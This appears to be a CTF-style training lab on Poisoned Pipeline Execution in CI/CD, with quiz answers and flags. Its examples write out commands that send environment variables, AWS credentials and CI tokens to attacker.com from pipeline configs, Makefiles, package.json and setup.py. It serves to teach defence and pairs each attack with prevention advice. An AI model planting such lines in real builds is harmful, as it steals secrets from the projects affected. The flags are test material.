# Room 3 — Task 1: PPE & CI/CD Attack Concepts (Deep Dive)

---

## What is Poisoned Pipeline Execution (PPE)?

PPE is any attack where malicious code is injected into a CI/CD pipeline and **executes in the pipeline's trusted context** — giving the attacker access to secrets, production systems, or artifact outputs.

The pipeline *trusts* the code it runs. Attackers abuse that trust.

---

## The Three Types — In Detail

### 1. Direct PPE (D-PPE)

**What:** Attacker modifies the pipeline definition file itself.

**Requires:** Write access to a branch that triggers CI.

**Example — GitLab CI:**
```yaml
# Attacker modifies .gitlab-ci.yml in a feature branch
test:
  script:
    - echo "Stealing secrets..."
    - curl https://attacker.com/collect?data=$(env | base64 -w0)
```

**Example — GitHub Actions:**
```yaml
# Attacker adds a step to an existing workflow
- name: Totally normal step
  run: |
    curl -s https://attacker.com/x?d=$(printenv | base64 -w0) || true
```

**Why it works:** The pipeline runner executes whatever is in the config file with full access to the job's environment variables (which include secrets).

**Prevention:**
- Branch protection — require PRs + code review for any branch that triggers CI
- Require at least 1 approver who reviews pipeline config changes
- Separate pipeline config changes from normal code changes (require extra reviewers)

---

### 2. Indirect PPE (I-PPE)

**What:** Attacker can't modify the pipeline file, but modifies a file the pipeline *runs*.

**Requires:** Write access to any file the CI job executes (test file, Makefile, build script, etc.).

**Example — Makefile:**
```makefile
# Original
test:
    pytest tests/

# Attacker modifies to:
test:
    pytest tests/ && curl https://attacker.com/x?d=$$(cat $$HOME/.aws/credentials | base64 -w0)
```

**Example — package.json:**
```json
{
  "scripts": {
    "test": "jest && curl https://attacker.com/$(cat /proc/1/environ | base64 -w0)"
  }
}
```

**Example — setup.py (Python):**
```python
# Attacker adds to setup.py which runs during `pip install .`
import os, urllib.request
urllib.request.urlopen(f"https://attacker.com/?d={os.environ.get('CI_TOKEN','')}")
```

**Why it's sneaky:** Code reviewers often don't scrutinize `Makefile` or test config changes as carefully as pipeline config changes.

**Prevention:**
- Treat ALL files the pipeline executes as security-sensitive
- Review `Makefile`, `package.json`, `setup.py`, `build.gradle` changes carefully
- Consider separate jobs for "build scripts" with limited privileges

---

### 3. Public PPE (3PE)

**What:** An open-source project with CI triggered by pull requests from *anyone*. Attacker submits a PR with malicious code.

**Requires:** Nothing — just the ability to fork and open a PR.

**Example:**
```yaml
# The vulnerable workflow
on:
  pull_request:    # ← triggered by anyone's PR

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test   # ← runs attacker's package.json scripts
```

Attacker forks repo, modifies `package.json` test script to exfiltrate environment, opens PR.

**Key nuance:**
- `pull_request` — runs in sandboxed context, **no access to repo secrets** (safer)
- `pull_request_target` — runs with repo secrets, **extremely dangerous** with untrusted checkout

**Prevention:**
- Use `pull_request` (not `pull_request_target`) for community PRs
- Require maintainer approval before CI runs on first-time contributor PRs
- Set `ACTIONS_RUNNER_DEBUG: true` only in protected environments

---

## OWASP CI/CD Top 10 — Deep Dive

| ID | Risk | Real-World Impact |
|----|------|-------------------|
| CICD-SEC-1 | Insufficient Flow Control | No branch protection → anyone pushes to main |
| CICD-SEC-2 | Inadequate IAM | Build runner has admin rights to everything |
| CICD-SEC-3 | Dependency Chain Abuse | Malicious npm/PyPI package in your build |
| CICD-SEC-4 | Poisoned Pipeline Execution | Attacker injects code that runs in CI |
| CICD-SEC-5 | Insufficient PBAC | Pipeline can access resources it shouldn't |
| CICD-SEC-6 | Insufficient Credential Hygiene | Secrets in logs, long-lived tokens |
| CICD-SEC-7 | Insecure System Configuration | Default Jenkins with no auth |
| CICD-SEC-8 | Ungoverned 3rd Party Services | Using a GitHub Action with no code review |
| CICD-SEC-9 | Improper Artifact Integrity | Build output swapped before deploy |
| CICD-SEC-10 | Insufficient Logging | No record of who triggered what |

---

## Questions

### Q1. An attacker submits a pull request to an open-source repo. The CI runs their modified `Makefile`. What type of PPE is this?

<details>
<summary>Answer + Flag</summary>

**Indirect PPE (I-PPE)** — The attacker modified a file the pipeline executes (`Makefile`), not the pipeline config itself.

It's also a **Public PPE (3PE)** scenario since the vector is an open PR from an external attacker.

(Both answers are valid — it's the intersection of I-PPE and 3PE.)

**Flag:** `THM{Indirect_PPE_Via_Makefile}`
</details>

---

### Q2. Which OWASP CI/CD risk covers the scenario where a malicious npm package is pulled in during your build?

<details>
<summary>Answer + Flag</summary>

**CICD-SEC-3 — Dependency Chain Abuse**

This covers:
- Typosquatting (`lodahs` instead of `lodash`)
- Dependency confusion (private package name registered publicly)
- Compromised package maintainer accounts

**Flag:** `THM{CICD_SEC_3_Dependency_Chain_Abuse}`
</details>

---

### Q3. Your build job's `GITHUB_TOKEN` has `contents: write` permission. An attacker achieves PPE. What can they now do to your repository?

<details>
<summary>Answer + Flag</summary>

With `contents: write` they can:
- **Push code to any branch** — inject backdoors
- **Create new branches** 
- **Delete branches** (destructive)
- **Modify release artifacts**

If the token also has `packages: write`: push malicious container images to your registry.

If the token also has `actions: write`: modify other workflow files.

**Mitigation:** Always set minimum permissions:
```yaml
permissions:
  contents: read  # default to read
```

**Flag:** `THM{Stolen_GITHUB_TOKEN_With_Write_Is_Game_Over}`
</details>

---

### Q4. What is dependency confusion and how does it work?

<details>
<summary>Answer + Flag</summary>

**Scenario:**
Your company uses a private npm package called `acmecorp-utils` hosted on a private registry.

**Attack:**
1. Attacker discovers the name `acmecorp-utils` (from a leaked `package.json`, job postings, etc.)
2. Registers `acmecorp-utils` on **public** npm with a higher version number (e.g. `9.9.9`)
3. When your CI runs `npm install`, npm checks the public registry first (by default)
4. npm sees version `9.9.9` on public > `1.2.3` on private → downloads attacker's malicious package

**Real incident:** Alex Birsan pulled this off against Apple, Microsoft, Netflix, PayPal and 30+ other companies in 2021, earning $130,000+ in bug bounties.

**Mitigations:**
- Scope private packages: `@acmecorp/utils` (scoped names aren't on public npm by default)
- Configure npm to **always** use private registry for internal packages
- Use `.npmrc` with `@acmecorp:registry=https://private.registry.acmecorp.com`

**Flag:** `THM{Dependency_Confusion_Alex_Birsan_2021}`
</details>

---

Move to → [task2-ppe-simulation.md](task2-ppe-simulation.md)
